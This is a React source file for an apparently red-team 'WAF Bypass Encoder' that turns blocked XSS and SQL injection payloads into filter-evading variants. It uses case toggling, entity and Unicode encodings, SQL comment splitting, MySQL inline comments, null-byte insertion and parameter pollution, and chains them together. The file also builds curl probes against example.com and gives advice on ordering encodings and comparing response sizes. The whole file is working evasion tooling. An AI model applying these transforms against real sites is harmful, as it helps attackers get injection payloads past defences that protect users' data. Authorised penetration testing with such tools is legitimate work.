import { useMemo, useState } from 'react';
import {
  Callout,
  Card,
  Checkbox,
  CodeBlock,
  CopyChip,
  DownloadButton,
  SectionTitle,
  TextArea,
  TextInput,
} from '@/components/ui';
import { WAF_TRANSFORMS } from '@/lib/redteam-data';
import { base64FromBytes } from '@/lib/bytes';

type Row = { name: string; output: string; bytes: number; note: string };

/** Extra transforms layered on top of the shared WAF_TRANSFORMS table. */
const EXTRA: Array<{ name: string; note: string; apply: (p: string) => string }> = [
  {
    name: 'Case toggle per char',
    note: 'Alternating case defeats case-sensitive keyword regexes',
    apply: (p) => Array.from(p, (c, i) => (i % 2 ? c.toUpperCase() : c.toLowerCase())).join(''),
  },
  {
    name: 'HTML entity (decimal)',
    note: 'Decimal numeric entities, decoded by the browser not the WAF',
    apply: (p) => p.replace(/[<>"'&]/g, (c) => `&#${c.charCodeAt(0)};`),
  },
  {
    name: 'HTML entity (hex)',
    note: 'Hex numeric entities — same decode path, different byte pattern',
    apply: (p) => p.replace(/[<>"'&]/g, (c) => `&#x${c.charCodeAt(0).toString(16)};`),
  },
  {
    name: 'Unicode fullwidth',
    note: 'Fullwidth ASCII is NFKC-normalised downstream by lenient parsers',
    apply: (p) => p.replace(/[!-~]/g, (c) => String.fromCharCode(c.charCodeAt(0) + 0xfee0)),
  },
  {
    name: 'Comment insertion',
    note: 'Splits keywords every 3 chars with /**/',
    apply: (p) => p.replace(/(select|union|script|alert|onerror)/gi, (m) => m.replace(/^(...)(.*)$/, '$1/**/$2')),
  },
  {
    name: 'Whitespace substitution',
    note: 'Swaps spaces for tabs and form feeds',
    apply: (p) => p.replace(/ /g, '%09').replace(/\t/g, '%0c'),
  },
  {
    name: 'MySQL inline comment',
    note: '/*!50000KEYWORD*/ executes the keyword on MySQL',
    apply: (p) => p.replace(/\b(SELECT|UNION|WHERE|AND|OR)\b/gi, '/*!50000$1*/'),
  },
  {
    name: 'SQL concat obfuscation',
    note: 'SELECT → SEL/**/ECT and CHAR() assembly for strings',
    apply: (p) => p.replace(/\bSELECT\b/gi, 'SEL/**/ECT').replace(/'([^']*)'/g, (m, s: string) => `CHAR(${Array.from(s, (c) => c.charCodeAt(0)).join(',')})`),
  },
  {
    name: 'Unicode escape',
    note: 'Backslash-u escapes per char — for JSON/JS sinks',
    apply: (p) => Array.from(p, (c) => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join(''),
  },
  {
    name: 'Base64 transport',
    note: 'Wraps the payload for transports that decode a body field',
    apply: (p) => base64FromBytes(new TextEncoder().encode(p)),
  },
  { name: 'Null + CR split', note: 'Null byte plus CR inserted mid-token', apply: (p) => p.replace(/<\s*script/i, '<\r%00script') },
  { name: 'Parameter pollution', note: 'Duplicate the payload across query keys', apply: (p) => `q=${encodeURIComponent(p)}&q=${encodeURIComponent(Array.from(p).reverse().join(''))}` },
];

const SHARED_NOTES: Record<string, string> = {
  'Case flip': 'Randomised case on the script keyword',
  'Double extension': 'Unicode-escapes "alert" for JSON/JS sinks',
  'URL encode': 'Single percent-encoding — one decode at the sink',
  'Double URL encode': 'Two passes — survives a single normaliser',
  'HTML entities': 'Decimal entities on the alert keyword',
  'Null byte': 'Null after the first tag — truncates C-string filters',
  'Comment break': 'HTML comment inside the tag name',
  'Tab whitespace': 'Tab separators in place of spaces',
  'Line break': 'Newline separators — parity with a CRLF-tolerant parser',
  'Slash swap': 'Backslash before slashes',
};

export default function WafBypassEncoder() {
  const [payload, setPayload] = useState('<script>alert(1)</script>');
  const [outKey, setOutKey] = useState('script');
  const [selected, setSelected] = useState<string[]>(['URL encode', 'HTML entity (hex)', 'Comment insertion', 'Case toggle per char']);
  const [chain, setChain] = useState(true);

  const all = useMemo(
    () => [
      ...WAF_TRANSFORMS.map(([name, fn]) => ({ name, note: SHARED_NOTES[name] ?? 'Shared transform table', apply: fn })),
      ...EXTRA,
    ],
    [],
  );

  const rows = useMemo<Row[]>(() => {
    const p = payload;
    const list: Row[] = [];
    for (const t of all.filter((x) => selected.includes(x.name))) {
      let output = '';
      try {
        output = t.apply(p);
      } catch {
        output = `<transform failed for this input>`;
      }
      list.push({ name: t.name, output, bytes: new TextEncoder().encode(output).length, note: t.note });
    }
    if (chain && list.length > 1) {
      const chained = list.reduce((acc, r) => {
        const t = all.find((x) => x.name === r.name);
        return t ? t.apply(acc) : acc;
      }, p);
      list.push({ name: 'Chained (in order)', output: chained, bytes: new TextEncoder().encode(chained).length, note: 'All selected transforms, applied sequentially' });
    }
    return list;
  }, [payload, selected, chain, all]);

  const preflight = useMemo(() => {
    if (!payload.trim()) return '';
    const k = outKey.trim() || 'test';
    return [
      `# Baseline`,
      `curl -sS -o /dev/null -w '%{http_code} %{size_download}\\n' --data-urlencode '${k}=${payload}' https://example.com/api/probe`,
      ...(rows.length
        ? ['', `# Chained variant`, `curl -sS -o /dev/null -w '%{http_code} %{size_download}\\n' --data-urlencode '${k}=${rows[rows.length - 1].output}' https://example.com/api/probe`]
        : []),
    ].join('\n');
  }, [payload, rows, outKey]);

  const download = rows.map((r) => `${r.name}\t${r.bytes}B\t${r.output}`).join('\n');

  return (
    <>
      <Card title="Input">
        <div className="grid gap-4 lg:grid-cols-[2fr_1fr]">
          <TextArea label="Blocked payload" value={payload} onChange={setPayload} rows={4} placeholder="<script>alert(1)</script>" />
          <div className="flex flex-col gap-4">
            <TextInput label="Parameter name" value={outKey} onChange={setOutKey} mono hint="Used in the preflight commands" />
            <div className="pt-1">
              <Checkbox checked={chain} onChange={setChain} label="Append chained output" description="Also emit the full transform chain applied in order" />
            </div>
          </div>
        </div>
      </Card>

      <Card title="Transforms" action={<DownloadButton text={download} filename="waf-variants.txt" label="Download .txt" />}>
        <div className="grid gap-2.5 sm:grid-cols-2 lg:grid-cols-3">
          {all.map((t) => (
            <Checkbox
              key={t.name}
              checked={selected.includes(t.name)}
              onChange={(on) => setSelected((prev) => (on ? [...prev, t.name] : prev.filter((x) => x !== t.name)))}
              label={t.name}
              description={t.note}
            />
          ))}
        </div>
      </Card>

      <Card title="Results">
        {rows.length === 0 ? (
          <Callout tone="info" title="No transform selected">Pick one or more transforms to compare outputs.</Callout>
        ) : (
          <div className="overflow-x-auto rounded border border-[var(--card-border)]">
            <table className="w-full text-[12.5px]">
              <thead>
                <tr className="bg-[var(--neutral-btn)] text-[11.5px] tracking-wide text-[var(--text-muted)] uppercase">
                  <th className="px-3 py-2 text-left font-medium">Transformation</th>
                  <th className="px-3 py-2 text-left font-medium">Output</th>
                  <th className="px-3 py-2 text-right font-medium">Bytes</th>
                  <th className="px-3 py-2 text-right font-medium">Copy</th>
                </tr>
              </thead>
              <tbody>
                {rows.map((r, i) => (
                  <tr key={r.name} className={i % 2 ? 'bg-[var(--neutral-btn)]' : ''}>
                    <td className="px-3 py-1.5 align-top text-[var(--text)]" title={r.note}>
                      {r.name}
                    </td>
                    <td className="rf-mono px-3 py-1.5 align-top break-all text-[var(--text-muted)]">{r.output}</td>
                    <td className="rf-mono px-3 py-1.5 text-right align-top text-[var(--text-faint)]">{r.bytes}</td>
                    <td className="px-3 py-1 text-right align-top">
                      <CopyChip text={r.output} label="" />
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
        <div className="mt-4">
          <SectionTitle>Preflight comparison</SectionTitle>
          <CodeBlock code={preflight} label="curl baseline vs chained" />
        </div>
      </Card>

      <Card title="Notes">
        <Callout tone="warn" title="Ordering matters">
          Encode before you comment-split, and never URL-encode a payload you already emitted as HTML entities — the sink
          decodes entities once and percent-decoding twice is what breaks half of the chains. Compare{' '}
          <span className="rf-mono">size_download</span> against the blocked baseline: an identical length usually means the
          WAF normalised the variant back to the blocked form, so move to the next family.
        </Callout>
      </Card>
    </>
  );
}
